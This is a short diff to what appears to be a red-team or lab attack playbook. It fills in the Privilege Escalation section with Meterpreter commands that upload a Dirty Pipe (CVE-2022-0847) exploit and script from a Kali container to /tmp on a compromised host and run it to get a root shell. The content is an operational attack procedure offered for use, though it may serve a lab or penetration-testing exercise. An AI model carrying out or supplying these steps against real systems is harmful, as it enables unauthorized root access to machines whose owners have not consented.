@@ -11,8 +11,14 @@
 
 # Privilege Escalation
 ```bash
+# All commands shall be executed inside the Meterpreter session established in Execution phase
+# Upload dirtypipe.sh and CVE-2022-0847.c to /tmp directory
+# Both files are located in / directory of Kali container
+upload dirtypipe.sh /tmp
+upload CVE-2022-0847.c /tmp
 
-
+# Execute dirtypipe.sh to get root shell
+execute -f ./tmp/dirtypipe.sh -i -H
 ```
 
 # Discovery
